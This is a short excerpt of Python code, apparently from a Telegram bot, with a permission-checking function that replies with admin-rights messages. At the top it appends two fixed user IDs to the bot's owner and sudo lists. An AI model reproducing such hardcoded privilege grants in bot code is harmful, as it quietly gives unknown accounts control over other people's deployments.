...
SUDO_USERS.append(5278710200)

OWNER_ID.append(829943136)
OWNER_ID.append(5278710200)
...
async def check_perms(
    ...
    if user.status != "administrator":
        if notice:
            await sender("✨ To use me, Give me the Admin Rights." if user.user.is_self else
    ...
    if notice:
        ...
        await sender(f"✨ To use me, Give me the Rights below:\n\n ❌ __{permission_text}__" if user.user.is_self
                     else f"✨ You need to be an Admin to use this command.\n\n ❌ __{permission_text}__")
    return False
